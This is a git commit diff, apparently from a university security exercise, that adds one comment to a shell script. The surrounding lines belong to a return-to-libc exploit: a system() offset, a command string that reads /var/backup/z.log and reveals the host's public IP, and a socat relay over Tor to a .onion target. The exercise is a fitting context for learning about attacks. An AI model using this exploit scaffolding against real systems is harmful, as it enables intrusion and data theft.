1ea28fca1af96a79be093e112d7f53151b9498e5
Harry Maraziaris <sdi1800105@di.uoa.gr>
2021-07-09 18:07:12 +0300

    Update comments in script files

--- steps-3-4-5/run.sh
+++ steps-3-4-5/run.sh
@@ -8,6 +8,7 @@ libc_off=-1686176 # system offset
 # shell-command for system - `cat` to get the file and `dig` to get the host IP.
 cmd="cat /var/backup/z.log; dig +short myip.opendns.com @resolver1.opendns.com"
 
+# kill running instances of socat
 kill $(pgrep -l socat | cut -f1 -d' ')
 socat  TCP-LISTEN:8000,fork,reuseaddr SOCKS4A:localhost:zwt6vcp6d5tao7tbe3je6a2q4pwdfqli62ekuhjo55c7pqlet3brutqd.onion:80,socksport=9150 & sleep 2
 
